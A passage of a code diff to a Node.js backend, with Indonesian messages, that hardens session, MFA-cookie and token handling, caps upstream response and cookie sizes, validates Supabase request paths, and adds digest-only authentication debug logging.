+  }).catch(() => null);
+  customerSecuritySessionDecisionDebugV219(req, 'protected_session.refresh_result', {
+    decision: touched && touched.ok === true && String(touched.session_id || '') === String(row.id)
+      ? 'refresh_accepted'
+      : 'refresh_failed',
+    result: touched && touched.reason || (touched && touched.ok ? 'ok' : 'invalid_result'),
+    database_operation: 'PATCH',
+    touch_ok: Boolean(touched && touched.ok === true),
+    session_id_match: Boolean(touched && String(touched.session_id || '') === String(row.id)),
+    session_id_digest: customerSecurityShortDigestV219(row.id),
+    diagnostic_code: touched && touched.diagnostic_code || '',
+    failure_point: touched && touched.failure_point || '',
+    provider_code: touched && touched.provider_code || '',
+    upstream_status: touched && Number(touched.status || touched.upstream_status || 0) || 0
+  });
+  if (!touched || touched.ok !== true || String(touched.session_id || '') !== String(row.id)) {
+    return {
+      ok: false,
+      status: 503,
+      code: 'PROTECTED_SESSION_REFRESH_UNAVAILABLE',
+      customerId,
+      sessionId: row.id,
+      message: 'Sesi protected belum dapat diperbarui secara aman. Silakan coba lagi.',
+      diagnostic_code: touched && touched.diagnostic_code || 'SESSION_STORE_REFRESH_RESULT_INVALID',
+      failure_point: touched && touched.failure_point || 'customerSecurityTouchCurrentSession.refresh',
+      upstream_status: touched && Number(touched.status || touched.upstream_status || 0) || undefined,
+      provider_code: touched && touched.provider_code || undefined,
+      failure_id: touched && touched.failure_id || undefined
+    };
+  }
+  customerSecuritySessionDecisionDebugV219(req, 'protected_session.accepted', {
+    decision: 'dashboard_session_active',
+    customer_digest: customerSecurityShortDigestV219(customerId),
+    session_id_digest: customerSecurityShortDigestV219(row.id),
+    session_status: status,
+    idle_ms: idleMs,
+    idle_timeout_ms: DOMAIN_PROTECTED_IDLE_TIMEOUT_MS,
+    touch_ok: true,
+    session_id_match: true
+  });
+  return { ok: true, customerId, sessionId: row.id, idleMs, idle_timeout_ms: DOMAIN_PROTECTED_IDLE_TIMEOUT_MS, touched: true };
 }
 
 async function revokeCurrentDomainProtectedSessionSafe(req, reason) {
@@ -1917,6 +2383,11 @@ async function domainDashboardMe(req, res) {
   if (!access) return;
 
   const { user, mfa } = access;
+  customerSecuritySessionDecisionDebugV219(req, 'dashboard_response.200', {
+    decision: 'respond_200_dashboard_true',
+    result: 'ok',
+    mfa_source: mfa && mfa.source || ''
+  });
 
   return res.status(200).json({
     ok: true,
@@ -1990,7 +2461,7 @@ async function domainCheck(req, res) {
 
   const checkApi = requiredEnv('DOMAIN_CHECK_API');
   const response = await fetch(`${checkApi}?domain=${encodeURIComponent(domain)}`);
-  const data = await response.json().catch(() => ({}));
+  const data = await parseFetchResponse(response, 512 * 1024).catch(() => ({}));
 
   return res.status(response.status).json(data);
 }
@@ -2353,10 +2824,11 @@ async function requireDomainUser(req, res) {
   const headerRefreshToken = acceptFrontendAuthHeaders
     ? String((req.headers && (req.headers['x-domain-refresh'] || req.headers['x-refresh-token'])) || '').trim()
     : '';
+  const accessCookieTokens = readCookieTokenCandidates(cookies, ACCESS_COOKIE);
 
   const accessTokens = uniqueNonEmptyStrings([
     headerToken,
-    ...readCookieTokenCandidates(cookies, ACCESS_COOKIE)
+    ...accessCookieTokens
   ]);
 
   for (const accessToken of accessTokens) {
@@ -2367,13 +2839,27 @@ async function requireDomainUser(req, res) {
     });
 
     if (userResult.ok && userResult.data && userResult.data.id) {
+      const authDebug = customerSecuritySetAuthDebugV219(req, {
+        source: headerToken && accessToken === headerToken
+          ? 'bearer_header'
+          : 'access_cookie_' + Math.max(0, accessCookieTokens.indexOf(accessToken)),
+        path: 'access_token',
+        token_digest: customerSecurityShortDigestV219(accessToken),
+        access_candidate_count: accessTokens.length,
+        refresh_candidate_count: 0,
+        frontend_headers_accepted: acceptFrontendAuthHeaders,
+        refreshed: false,
+        authenticated: true
+      });
+      customerSecuritySessionDecisionDebugV219(req, 'auth.access_token.accepted', authDebug || {});
       return userResult.data;
     }
   }
 
+  const refreshCookieTokens = readCookieTokenCandidates(cookies, REFRESH_COOKIE);
   const refreshTokens = uniqueNonEmptyStrings([
     headerRefreshToken,
-    ...readCookieTokenCandidates(cookies, REFRESH_COOKIE)
+    ...refreshCookieTokens
   ]);
 
   for (const refreshToken of refreshTokens) {
@@ -2394,6 +2880,19 @@ async function requireDomainUser(req, res) {
           res.setHeader('X-Domain-Refresh-Token', refreshedSession.refresh_token);
         }
         res.setHeader('X-Domain-Token-Refreshed', 'true');
+        const authDebug = customerSecuritySetAuthDebugV219(req, {
+          source: headerRefreshToken && refreshToken === headerRefreshToken
+            ? 'refresh_header'
+            : 'refresh_cookie_' + Math.max(0, refreshCookieTokens.indexOf(refreshToken)),
+          path: 'refresh_token',
+          token_digest: customerSecurityShortDigestV219(refreshedSession.access_token),
+          access_candidate_count: accessTokens.length,
+          refresh_candidate_count: refreshTokens.length,
+          frontend_headers_accepted: acceptFrontendAuthHeaders,
+          refreshed: true,
+          authenticated: true
+        });
+        customerSecuritySessionDecisionDebugV219(req, 'auth.refresh_token.accepted', authDebug || {});
         return refreshedSession.user || refreshResult.data.user;
       }
     }
@@ -2402,9 +2901,35 @@ async function requireDomainUser(req, res) {
   const signedSessionUser = await readSignedDomainSessionUser(cookies);
   if (signedSessionUser && signedSessionUser.id) {
     res.setHeader('X-Domain-Signed-Session', 'true');
+    const authDebug = customerSecuritySetAuthDebugV219(req, {
+      source: 'signed_session_cookie',
+      path: 'signed_session',
+      token_digest: '',
+      access_candidate_count: accessTokens.length,
+      refresh_candidate_count: refreshTokens.length,
+      frontend_headers_accepted: acceptFrontendAuthHeaders,
+      refreshed: false,
+      authenticated: true
+    });
+    customerSecuritySessionDecisionDebugV219(req, 'auth.signed_session.accepted', authDebug || {});
     return signedSessionUser;
   }
 
+  const authDebug = customerSecuritySetAuthDebugV219(req, {
+    source: 'none',
+    path: 'authentication_failed',
+    token_digest: '',
+    access_candidate_count: accessTokens.length,
+    refresh_candidate_count: refreshTokens.length,
+    frontend_headers_accepted: acceptFrontendAuthHeaders,
+    refreshed: false,
+    authenticated: false
+  });
+  customerSecuritySessionDecisionDebugV219(req, 'auth.rejected', {
+    ...(authDebug || {}),
+    decision: 'clear_cookies_and_401',
+    clear_cookies: true
+  });
   clearSessionCookies(res);
   res.status(401).json({ ok: false, message: 'Belum login atau sesi sudah habis.' });
   return null;
@@ -2414,8 +2939,9 @@ async function requireDomainUser(req, res) {
 function safeEqual(a, b) {
   const A = Buffer.from(String(a || ''));
   const B = Buffer.from(String(b || ''));
-  if (A.length !== B.length) return false;
-  return crypto.timingSafeEqual(A, B);
+  const digestA = crypto.createHash('sha512').update(A).digest();
+  const digestB = crypto.createHash('sha512').update(B).digest();
+  return A.length === B.length && crypto.timingSafeEqual(digestA, digestB);
 }
 
 function signDashboardMfa(data, secret) {
@@ -2481,8 +3007,13 @@ function customerMfaBindingHash(kind, value) {
 
 function getCustomerDashboardMfaToken(req) {
   const cookies = parseCookies(req);
-  const cookieToken = String(cookies[CUSTOMER_MFA_COOKIE] || '').trim();
-  if (cookieToken) return { token: cookieToken, source: 'http_only_cookie' };
+  const candidates = readCookieTokenCandidates(cookies, CUSTOMER_MFA_COOKIE).slice(0, 8);
+  if (candidates.length === 1) {
+    return { token: candidates[0], source: 'http_only_cookie' };
+  }
+  if (candidates.length > 1) {
+    return { token: '', source: 'ambiguous_http_only_cookie', ambiguous: true };
+  }
 
   // PATCH 3B: full backend customer auth.
   // MFA proof dari header frontend sengaja ditolak. JavaScript tidak boleh membawa
@@ -2518,12 +3049,21 @@ function verifyCustomerDashboardMfaCookie(req, user) {
     return { ok: false, code: 'mfa_cookie_customer_mismatch', message: 'Sesi A2F backend tidak cocok dengan customer login.' };
   }
 
-  if (payload.sessionHash) {
-    let expectedSessionHash = '';
-    try { expectedSessionHash = typeof diracCentralRequestSessionHashV146 === 'function' ? diracCentralRequestSessionHashV146(req) : ''; } catch (_) {}
-    if (expectedSessionHash && !safeEqual(String(payload.sessionHash), expectedSessionHash)) {
-      return { ok: false, code: 'mfa_cookie_session_mismatch', message: 'Sesi A2F backend tidak cocok dengan sesi login.' };
-    }
+  const securityEpoch = Number(payload.securityEpoch || 0);
+  if (!Number.isSafeInteger(securityEpoch) || securityEpoch < 1) {
+    return { ok: false, code: 'mfa_cookie_security_epoch_missing', message: 'Sesi A2F lama sudah dicabut. Login dan verifikasi Passkey ulang.' };
+  }
+
+  const sessionBindingVersion = Number(payload.sessionBindingVersion || 0);
+  const sessionBindingMatches = sessionBindingVersion === 5
+    && customerSecuritySignedSessionAnchorMatchesV228(
+      req,
+      user,
+      payload.sessionHash,
+      securityEpoch
+    );
+  if (!payload.sessionHash || !sessionBindingMatches) {
+    return { ok: false, code: 'mfa_cookie_session_mismatch', message: 'Sesi A2F backend tidak cocok dengan sesi login.' };
   }
 
   if (payload.originHash) {
@@ -2545,6 +3085,7 @@ function verifyCustomerDashboardMfaCookie(req, user) {
     method: String(payload.method || ''),
     activeAtMs: Number(payload.activeAtMs || 0),
     expiresAtMs: Number(payload.expiresAtMs || 0),
+    securityEpoch,
     source: proof.source
   };
 }
@@ -3106,8 +3647,56 @@ function getRetryAfterMs(response) {
   return Math.max(1, Number(process.env.HOSTINGER_DEFAULT_COOLDOWN_SECONDS || 60)) * 1000;
 }
 
-async function parseFetchResponse(response) {
-  const text = await response.text();
+async function diracReadResponseTextLimitedV210(response, maximum = 2 * 1024 * 1024) {
+  const limit = Math.max(1024, Math.min(16 * 1024 * 1024, Number(maximum || 0)));
+  const lengthHeader = String(response && response.headers && response.headers.get
+    ? response.headers.get('content-length') || ''
+    : '').trim();
+  if (lengthHeader && (!/^\d+$/.test(lengthHeader) || Number(lengthHeader) > limit)) {
+    const error = new Error('UPSTREAM_RESPONSE_TOO_LARGE');
+    error.code = 'UPSTREAM_RESPONSE_TOO_LARGE';
+    throw error;
+  }
+
+  if (!response || !response.body || typeof response.body.getReader !== 'function') {
+    const text = await response.text();
+    if (Buffer.byteLength(text, 'utf8') > limit) {
+      const error = new Error('UPSTREAM_RESPONSE_TOO_LARGE');
+      error.code = 'UPSTREAM_RESPONSE_TOO_LARGE';
+      throw error;
+    }
+    return text;
+  }
+
+  const reader = response.body.getReader();
+  const chunks = [];
+  let total = 0;
+  try {
+    for (;;) {
+      const item = await reader.read();
+      if (item.done) break;
+      const chunk = Buffer.from(item.value || []);
+      total += chunk.length;
+      if (total > limit) {
+        chunk.fill(0);
+        try { await reader.cancel('response_limit_exceeded'); } catch (_) {}
+        const error = new Error('UPSTREAM_RESPONSE_TOO_LARGE');
+        error.code = 'UPSTREAM_RESPONSE_TOO_LARGE';
+        throw error;
+      }
+      chunks.push(chunk);
+    }
+    const joined = Buffer.concat(chunks, total);
+    try { return joined.toString('utf8'); }
+    finally { joined.fill(0); }
+  } finally {
+    for (const chunk of chunks) chunk.fill(0);
+    try { reader.releaseLock(); } catch (_) {}
+  }
+}
+
+async function parseFetchResponse(response, maximum = 2 * 1024 * 1024) {
+  const text = await diracReadResponseTextLimitedV210(response, maximum);
 
   try {
     return text ? JSON.parse(text) : null;
@@ -3243,6 +3832,11 @@ const DIRAC_SUPABASE_TARGET_ENVS = Object.freeze({
     anonKey: 'DOMAIN_SUPABASE_ANON_KEY',
     serviceKey: 'DOMAIN_SUPABASE_SERVICE_ROLE_KEY'
   },
+  security: {
+    url: 'DIRAC_SECURITY_SUPABASE_URL',
+    anonKey: 'DIRAC_SECURITY_SUPABASE_ANON_KEY',
+    serviceKey: 'DIRAC_SECURITY_SUPABASE_SERVICE_ROLE_KEY'
+  },
   core: {
     url: 'DIRAC_CORE_SUPABASE_URL',
     anonKey: 'DIRAC_CORE_SUPABASE_ANON_KEY',
@@ -3360,9 +3954,21 @@ function resolveDiracSupabaseTargetKey(path, options = {}) {
   const forced = String(options.db || options.database || '').trim();
   if (forced && DIRAC_SUPABASE_TARGET_ENVS[forced]) return forced;
 
-  if (!shouldUseDiracMultiDbRouter()) return 'legacy';
+  const exactPath = String(path || '');
+  if (exactPath === '/rest/v1/rpc/dirac_central_atomic_consume_v230'
+      || exactPath === '/rest/v1/rpc/dirac_central_atomic_claim_record_v230'
+      || exactPath === '/rest/v1/rpc/dirac_central_atomic_rate_limit_v230'
+      || exactPath === '/rest/v1/rpc/dirac_central_security_log_v230') return 'security';
 
   const tableName = getDiracRestTableFromPath(path);
+  const dedicatedSecurityTables = new Set([
+    DIRAC_PERSISTENT_BAN_TABLE,
+    DIRAC_S2S_SECURITY_TABLE,
+    String(typeof DOMAIN_LOGIN_RATE_TABLE !== 'undefined' ? DOMAIN_LOGIN_RATE_TABLE : '').trim()
+  ].filter(Boolean));
+  if (tableName && dedicatedSecurityTables.has(tableName)) return 'security';
+
+  if (!shouldUseDiracMultiDbRouter()) return 'legacy';
   return DIRAC_TABLE_DB_MAP[tableName] || 'legacy';
 }
 
@@ -3382,6 +3988,10 @@ function readDiracSupabaseCredentials(targetKey) {
   const url = String(process.env[envs.url] || '').trim();
   const anonKey = String(process.env[envs.anonKey] || '').trim();
   const serviceKey = String(process.env[envs.serviceKey] || '').trim();
+
+  if (key === 'security' && (!url || !anonKey || !serviceKey)) {
+    throw new Error(`Missing dedicated security Supabase ENV: ${envs.url}, ${envs.anonKey}, ${envs.serviceKey}`);
+  }
 
   if (url && anonKey && serviceKey) {
     return {
@@ -3408,11 +4018,41 @@ function readDiracSupabaseCredentials(targetKey) {
 }
 
 async function supabaseFetch(path, options = {}) {
-  const targetKey = resolveDiracSupabaseTargetKey(path, options);
+  const cleanPath = String(path || '');
+  if ((!cleanPath.startsWith('/rest/v1/') && !cleanPath.startsWith('/auth/v1/'))
+      || cleanPath.startsWith('//')
+      || cleanPath.includes('\\')
+      || /[\r\n\0]/.test(cleanPath)) {
+    return { ok: false, status: 400, data: { code: 'SUPABASE_PATH_INVALID' } };
+  }
+  const method = String(options.method || 'GET').toUpperCase();
+  if (!['GET', 'HEAD', 'POST', 'PATCH', 'PUT', 'DELETE'].includes(method)) {
+    return { ok: false, status: 405, data: { code: 'SUPABASE_METHOD_NOT_ALLOWED' } };
+  }
+  const targetKey = resolveDiracSupabaseTargetKey(cleanPath, options);
   const target = readDiracSupabaseCredentials(targetKey);
+
+  let targetOrigin = '';
+  try {
+    const configured = new URL(String(target.url || ''));
+    if (configured.protocol !== 'https:'
+        || configured.username
+        || configured.password
+        || configured.search
+        || configured.hash
+        || (configured.port && configured.port !== '443')) {
+      throw new Error('SUPABASE_URL_INVALID');
+    }
+    targetOrigin = configured.origin;
+  } catch (_) {
+    return { ok: false, status: 503, data: { code: 'SUPABASE_CONFIGURATION_INVALID' } };
+  }
 
   const key = options.auth === 'service' ? target.serviceKey : target.anonKey;
   const bearer = options.bearer || key;
+  if (!key || !bearer || Buffer.byteLength(String(key), 'utf8') < 20) {
+    return { ok: false, status: 503, data: { code: 'SUPABASE_KEY_INVALID' } };
+  }
 
   const headers = {
     apikey: key,
@@ -3423,29 +4063,50 @@ async function supabaseFetch(path, options = {}) {
   if (options.prefer) headers.Prefer = options.prefer;
 
   const fetchOptions = {
-    method: options.method || 'GET',
-    headers
+    method,
+    headers,
+    redirect: 'error'
   };
 
   if (options.body !== undefined) {
     fetchOptions.body = JSON.stringify(options.body);
   }
 
-  const timeoutMs = Math.max(1000, Number(options.timeoutMs || process.env.DIRAC_SUPABASE_FETCH_TIMEOUT_MS || 6500) || 6500);
+  const timeoutMs = Math.max(1000, Math.min(30000, Number(options.timeoutMs || process.env.DIRAC_SUPABASE_FETCH_TIMEOUT_MS || 6500) || 6500));
   const controller = typeof AbortController !== 'undefined' ? new AbortController() : null;
+  const upstreamSignal = options && options.signal && typeof options.signal.addEventListener === 'function'
+    ? options.signal
+    : null;
+  let upstreamAbortListener = null;
   let timer = null;
   if (controller) {
     fetchOptions.signal = controller.signal;
+    if (upstreamSignal) {
+      if (upstreamSignal.aborted) {
+        controller.abort(upstreamSignal.reason);
+      } else {
+        upstreamAbortListener = () => controller.abort(upstreamSignal.reason);
+        upstreamSignal.addEventListener('abort', upstreamAbortListener, { once: true });
+      }
+    }
     timer = setTimeout(() => {
-      try { controller.abort(); } catch (_) {}
+      try {
+        const timeoutError = Object.assign(new Error('SUPABASE_FETCH_TIMEOUT'), {
+          name: 'AbortError',
+          code: 'SUPABASE_FETCH_TIMEOUT'
+        });
+        controller.abort(timeoutError);
+      } catch (abortErrorV231) {
+        diracCentralRecordSuppressedExceptionV221(abortErrorV231);
+      }
     }, timeoutMs);
   }
 
   let response;
   let text = '';
   try {
-    response = await fetch(`${target.url}${path}`, fetchOptions);
-    text = await response.text();
+    response = await fetch(targetOrigin + cleanPath, fetchOptions);
+    text = await diracReadResponseTextLimitedV210(response, 8 * 1024 * 1024);
   } catch (error) {
     return {
       ok: false,
@@ -3459,6 +4120,13 @@ async function supabaseFetch(path, options = {}) {
     };
   } finally {
     if (timer) clearTimeout(timer);
+    if (upstreamSignal && upstreamAbortListener) {
+      try {
+        upstreamSignal.removeEventListener('abort', upstreamAbortListener);
+      } catch (signalCleanupErrorV231) {
+        diracCentralRecordSuppressedExceptionV221(signalCleanupErrorV231);
+      }
+    }
   }
 
   let data = null;
@@ -3644,39 +4312,43 @@ async function readBody(req) {
 }
 
 function parseCookies(req) {
-  const header = req.headers && req.headers.cookie ? req.headers.cookie : '';
+  const header = String(req && req.headers && req.headers.cookie || '');
   if (req && req.__diracParseCookiesCache && req.__diracParseCookiesCache.header === header) {
     return req.__diracParseCookiesCache.cookies;
   }
 
-  const cookies = {};
+  const cookies = Object.create(null);
 
   Object.defineProperty(cookies, '__all', {
-    value: {},
+    value: Object.create(null),
     enumerable: false,
     configurable: false,
-    writable: true
+    writable: false
   });
 
-  header.split(';').map((item) => item.trim()).filter(Boolean).forEach((item) => {
-    const index = item.indexOf('=');
-    if (index === -1) {
-      if (!cookies.__all[item]) cookies.__all[item] = [];
-      cookies.__all[item].push('');
-      cookies[item] = '';
-      return;
-    }
+  // Refuse ambiguous or resource-exhausting Cookie headers. The Central Guard
+  // treats the resulting request as unauthenticated and continues fail-closed.
+  const parts = Buffer.byteLength(header, 'utf8') <= 16 * 1024
+    ? header.split(';').slice(0, 128).map((item) => item.trim()).filter(Boolean)
+    : [];
 
-    const key = item.slice(0, index);
-    let value = item.slice(index + 1);
+  parts.forEach((item) => {
+    const index = item.indexOf('=');
+    const key = String(index === -1 ? item : item.slice(0, index)).trim();
+    if (!key || key.length > 256 || key === '__all'
+        || !/^[!#$%&'*+\-.^_`|~0-9A-Za-z]+$/.test(key)) return;
+    let value = index === -1 ? '' : item.slice(index + 1);
+    if (Buffer.byteLength(value, 'utf8') > 8 * 1024) return;
     try {
       value = decodeURIComponent(value);
     } catch (_) {
       value = String(value || '');
     }
 
+    if (Buffer.byteLength(value, 'utf8') > 8 * 1024) return;
+
     if (!cookies.__all[key]) cookies.__all[key] = [];
-    cookies.__all[key].push(value);
+    if (cookies.__all[key].length < 8) cookies.__all[key].push(value);
 
     // Tetap simpan bentuk lama untuk kompatibilitas fungsi lain.
     // Kalau browser mengirim cookie dobel dari host/domain berbeda, nilai terakhir tetap legacy,
@@ -3750,6 +4422,30 @@ function appendSetCookie(res, cookies) {
       : [];
 
   res.setHeader('Set-Cookie', previousCookies.concat(nextCookies));
+}
+
+function replaceResponseCookieByNameV229(res, name, cookies) {
+  const cookieName = String(name || '').trim();
+  const nextCookies = (Array.isArray(cookies) ? cookies : [cookies]).filter(Boolean).map(String);
+  if (!res || typeof res.setHeader !== 'function' || !cookieName || !/^[!#$%&'*+\-.^_`|~0-9A-Za-z]+$/.test(cookieName) || !nextCookies.length) {
+    return false;
+  }
+
+  const current = typeof res.getHeader === 'function' ? res.getHeader('Set-Cookie') : null;
+  const previousCookies = Array.isArray(current)
+    ? current.map(String)
+    : current
+      ? [String(current)]
+      : [];
+  const retained = previousCookies.filter((value) => {
+    const first = String(value || '').split(';', 1)[0];
+    const separator = first.indexOf('=');
+    const existingName = separator === -1 ? first.trim() : first.slice(0, separator).trim();
+    return existingName !== cookieName;
+  });
+
+  res.setHeader('Set-Cookie', retained.concat(nextCookies));
+  return true;
 }
 
 function makeCookie(name, value, options = {}) {
@@ -3982,6 +4678,38 @@ function clearSessionCookies(res) {
   ]);
 }
 
+function clearCurrentRequestSessionCookiesV235(req, res) {
+  const requestCookies = parseCookies(req);
+  const baseNames = [
+    ACCESS_COOKIE,
+    REFRESH_COOKIE,
+    CUSTOMER_MFA_COOKIE,
+    DOMAIN_SIGNED_SESSION_COOKIE
+  ];
+  const namesToClear = new Set(baseNames);
+
+  baseNames.forEach((baseName) => {
+    for (let index = 0; index < DOMAIN_COOKIE_MAX_CHUNKS; index += 1) {
+      const chunkName = `${baseName}__${index}`;
+      const duplicateValues = requestCookies.__all
+        && Array.isArray(requestCookies.__all[chunkName])
+        ? requestCookies.__all[chunkName]
+        : [];
+      if (Object.prototype.hasOwnProperty.call(requestCookies, chunkName)
+          || duplicateValues.length > 0) {
+        namesToClear.add(chunkName);
+      }
+    }
+  });
+
+  const clearCookies = [];
+  namesToClear.forEach((name) => {
+    clearCookies.push(...makeCompactClearCookie(name));
+  });
+  appendSetCookie(res, clearCookies);
+  return clearCookies.length > 0;
+}
+
 function base64UrlJson(value) {
   return Buffer.from(JSON.stringify(value)).toString('base64url');
 }
@@ -4004,14 +4732,22 @@ function getDomainSignedSessionSecret() {
   return diracCentralDeriveSecretV146('domain-signed-session').toString('base64url');
 }
 
+function normalizeDomainSignedSessionId(value) {
+  const clean = String(value || '').trim();
+  return /^[A-Za-z0-9][A-Za-z0-9._:-]{15,199}$/.test(clean) ? clean : '';
+}
+
 function extractUserForSignedDomainSession(session) {
   const sessionObj = session && typeof session === 'object' ? session : {};
   const user = sessionObj.user && typeof sessionObj.user === 'object' ? sessionObj.user : {};
   const jwt = decodeJwtPayloadUnsafe(sessionObj.access_token);
   const id = String(user.id || user.sub || (jwt && (jwt.sub || jwt.user_id)) || '').trim();
   const email = normalizeAuthEmail(user.email || (jwt && jwt.email) || '');
+  const sessionId = normalizeDomainSignedSessionId(
+    sessionObj.session_id || sessionObj.sessionId || (jwt && (jwt.session_id || jwt.sid)) || ''
+  );
   if (!id || !email) return null;
-  return { id, email };
+  return { id, email, sessionId };
 }
 
 function signDomainSessionPayload(payload) {
@@ -4037,8 +4773,78 @@ function verifyDomainSessionCookieValue(value) {
   if (!Number.isFinite(exp) || exp <= Math.floor(Date.now() / 1000)) return null;
   const id = String(payload.uid || payload.id || '').trim();
   const email = normalizeAuthEmail(payload.email || '');
-  if (!id || !email) return null;
-  return { id, email, exp };
+  const sessionId = payload.sid === undefined ? '' : normalizeDomainSignedSessionId(payload.sid);
+  if (!id || !email || (payload.sid !== undefined && !sessionId)) return null;
+  return { id, email, exp, sessionId };
+}
+
+const DIRAC_SIGNED_SESSION_MFA_CONTINUITY_V230 = 'dirac-signed-session-mfa-continuity-v230';
+
+function diracCurrentRequestForSignedSessionV230() {
+  try {
+    const ctx = typeof diracCentralCurrentContextV149 === 'function'
+      ? diracCentralCurrentContextV149()
+      : null;
+    return ctx && ctx.req && typeof ctx.req === 'object' ? ctx.req : null;
+  } catch (_) {
+    return null;
+  }
+}
+
+function diracVerifiedMfaSignedSessionContinuityV230(req, nextUser) {
+  const userId = String(nextUser && nextUser.id || '').trim();
+  const email = normalizeAuthEmail(nextUser && nextUser.email || '');
+  const nextSessionId = normalizeDomainSignedSessionId(nextUser && nextUser.sessionId || '');
+  if (!req || !userId || !email || !nextSessionId) return null;
+
+  const cookies = parseCookies(req);
+  const mfaCandidates = readCookieTokenCandidates(cookies, CUSTOMER_MFA_COOKIE).slice(0, 8);
+  if (mfaCandidates.length !== 1) return null;
+
+  const mfaPayload = decodeCustomerDashboardMfaToken(mfaCandidates[0]);
+  const nowMs = Date.now();
+  const securityEpoch = Number(mfaPayload && mfaPayload.securityEpoch || 0);
+  if (!mfaPayload || mfaPayload.type !== CUSTOMER_MFA_SESSION_TYPE
+      || Number(mfaPayload.sessionBindingVersion) !== 5
+      || !Number.isSafeInteger(securityEpoch) || securityEpoch < 1
+      || !Number.isSafeInteger(Number(mfaPayload.expiresAtMs))
+      || Number(mfaPayload.expiresAtMs) <= nowMs
+      || !mfaPayload.sessionHash
+      || !safeEqual(String(mfaPayload.emailHash || ''), customerMfaProfileId(email))
+      || !safeEqual(String(mfaPayload.authUserIdHash || ''), customerMfaBindingHash('auth_user_id', userId))) {
+    return null;
+  }
+
+  const expectedOriginHash = customerMfaBindingHash('origin', requestOrigin(req));
+  const expectedUaHash = customerMfaBindingHash('ua', requestUserAgent(req));
+  if ((mfaPayload.originHash && (!expectedOriginHash || !safeEqual(String(mfaPayload.originHash), expectedOriginHash)))
+      || (mfaPayload.uaHash && (!expectedUaHash || !safeEqual(String(mfaPayload.uaHash), expectedUaHash)))) {
+    return null;
+  }
+
+  const signedCandidates = readCookieTokenCandidates(cookies, DOMAIN_SIGNED_SESSION_COOKIE).slice(0, 8);
+  if (signedCandidates.length !== 1) return null;
+  const selected = {
+    value: signedCandidates[0],
+    decoded: customerSecurityDecodeSignedSessionAnchorV228(signedCandidates[0])
+  };
+  if (!selected.decoded
+      || selected.decoded.userId !== userId
+      || selected.decoded.email !== email
+      || selected.decoded.sessionId !== nextSessionId
+      || selected.decoded.securityEpoch !== securityEpoch
+      || !safeEqual(selected.decoded.binding, String(mfaPayload.sessionHash))) return null;
+
+  const remainingSeconds = Math.floor((Number(selected.decoded.expiresAt) * 1000 - nowMs) / 1000);
+  if (!Number.isSafeInteger(remainingSeconds) || remainingSeconds < 60) return null;
+
+  return Object.freeze({
+    patch: DIRAC_SIGNED_SESSION_MFA_CONTINUITY_V230,
+    value: selected.value,
+    maxAgeSeconds: remainingSeconds,
+    sessionId: nextSessionId,
+    binding: String(selected.decoded.binding)
+  });
 }
 
 function makeSignedDomainSessionCookieSet(session, options = {}) {
@@ -4047,18 +4853,36 @@ function makeSignedDomainSessionCookieSet(session, options = {}) {
   const cookies = [];
   if (!user) return cookies;
 
+  const req = diracCurrentRequestForSignedSessionV230();
+  const continuity = diracVerifiedMfaSignedSessionContinuityV230(req, user);
+  if (continuity) {
+    cookies.push(makeCookie(DOMAIN_SIGNED_SESSION_COOKIE, continuity.value, {
+      maxAge: Math.min(maxAge, continuity.maxAgeSeconds),
+      domain: ''
+    }));
+    return cookies;
+  }
+
   const now = Math.floor(Date.now() / 1000);
-  const value = signDomainSessionPayload({
+  const payload = {
     typ: DOMAIN_SIGNED_SESSION_TYPE,
     uid: user.id,
     email: user.email,
     iat: now,
     exp: now + maxAge,
     nonce: crypto.randomBytes(12).toString('base64url')
-  });
+  };
+  if (user.sessionId) payload.sid = user.sessionId;
+  const value = signDomainSessionPayload(payload);
   if (!value) return cookies;
 
   cookies.push(makeCookie(DOMAIN_SIGNED_SESSION_COOKIE, value, { maxAge, domain: '' }));
+  if (req) {
+    const requestCookies = parseCookies(req);
+    if (readCookieTokenCandidates(requestCookies, CUSTOMER_MFA_COOKIE).length) {
+      cookies.push(...makeClearTokenCookieSet(CUSTOMER_MFA_COOKIE));
+    }
+  }
   return cookies;
 }
 
@@ -4130,9 +4954,9 @@ function requiredEnv(name) {
    GET /api/health?action=customer-security-status
    ============================================================ */
 
-const __diracOriginalHealthHandler = module.exports;
+const __diracOriginalHealthHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function customerSecurityHealthWrapper(req, res) {
+__diracV202RegisterMiddleware(async function customerSecurityHealthWrapper(req, res, nextHandlerV202) {
   const rawAction = String((req.query && req.query.action) || '').trim();
   const action = customerSecurityNormalizeAction(rawAction);
 
@@ -4143,8 +4967,8 @@ module.exports = async function customerSecurityHealthWrapper(req, res) {
     return customerSecurityStatus(req, res);
   }
 
-  return __diracOriginalHealthHandler(req, res);
-};
+  return nextHandlerV202(req, res);
+}, "customerSecurityHealthWrapper");
 
 function customerSecurityNormalizeAction(action) {
   const clean = String(action || '').trim().toLowerCase();
@@ -4300,9 +5124,9 @@ function customerSecuritySchemaPendingStatus(user, endpoint) {
    GET /api/health?action=customer_security_dashboard
    ============================================================ */
 
-const __diracCustomerSecurityWrapperV2PreviousHandler = module.exports;
+const __diracCustomerSecurityWrapperV2PreviousHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function customerSecurityOverviewWrapper(req, res) {
+__diracV202RegisterMiddleware(async function customerSecurityOverviewWrapper(req, res, nextHandlerV202) {
   const rawAction = String((req.query && req.query.action) || '').trim();
   const action = customerSecurityOverviewNormalizeAction(rawAction);
 
@@ -4313,8 +5137,8 @@ module.exports = async function customerSecurityOverviewWrapper(req, res) {
     return customerSecurityOverview(req, res);
   }
 
-  return __diracCustomerSecurityWrapperV2PreviousHandler(req, res);
-};
+  return nextHandlerV202(req, res);
+}, "customerSecurityOverviewWrapper");
 
 function customerSecurityOverviewNormalizeAction(action) {
   const clean = String(action || '').trim().toLowerCase();
@@ -4607,20 +5431,20 @@ async function customerSecurityFetchRows(tableName, columns, customerId, orderBy
    - Semua akses database tetap backend service_role-only.
    ============================================================ */
 
-const __diracCustomerSecurityRegisterBootstrapPreviousHandler = module.exports;
+const __diracCustomerSecurityRegisterBootstrapPreviousHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function customerSecurityRegisterBootstrapWrapper(req, res) {
+__diracV202RegisterMiddleware(async function customerSecurityRegisterBootstrapWrapper(req, res, nextHandlerV202) {
   const rawAction = String((req.query && req.query.action) || '').trim();
   const action = customerSecurityRegisterBootstrapNormalizeAction(rawAction);
 
   if (!customerSecurityRegisterBootstrapIsRegisterAction(action) || req.method !== 'POST') {
-    return __diracCustomerSecurityRegisterBootstrapPreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
